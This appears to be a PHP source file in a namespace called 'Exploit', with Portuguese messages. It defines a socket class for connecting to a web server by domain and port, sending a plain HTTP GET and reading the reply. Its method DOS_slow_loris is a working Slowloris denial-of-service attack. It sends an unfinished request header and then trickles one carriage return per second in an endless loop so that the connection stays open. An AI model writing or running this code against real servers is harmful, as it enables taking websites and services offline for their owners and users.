<?php
namespace Exploit;
set_time_limit(0);
class Socket{

    private $socket;
    private $ip;
    private $dominio;
    private $porta;

    public function __construct($dominio, $porta){
        $this->ip = gethostbyname($dominio);
        $this->porta = $porta;
        $this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die('Não foi possível criar o socket');
        $result = socket_connect($this->socket, $this->ip, $porta) or die('Não foi possível conectar ao servidor');
    }

    public function web(){
        $in = "GET / HTTP/1.1\r\n";
        $in .= "Host: ".$this->ip."\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($this->socket, $in, strlen($in)) or die('Não foi possível enviar dados ao servidor'); 
    }

    public function ler_socket(){
        while ($out = socket_read($this->socket, 2048)) {
            echo $out;
        }
    }

    public function fechar(){
        return socket_close($this->socket);
    }

    public function DOS_slow_loris(){
        $in = "GET / HTTP/1.1\r\n";
        $in .= "Host: ".$this->ip."\r\n";
        $in .= "Connection: Close";
        socket_write($this->socket, $in, strlen($in)) or die('Não foi possível enviar dados ao servidor');
        $str = "\r";
        do{
            socket_write($this->socket, $str, strlen($str)) or die('Não foi possível enviar dados ao servidor');
            sleep(1);
        } while(true);
    }
}

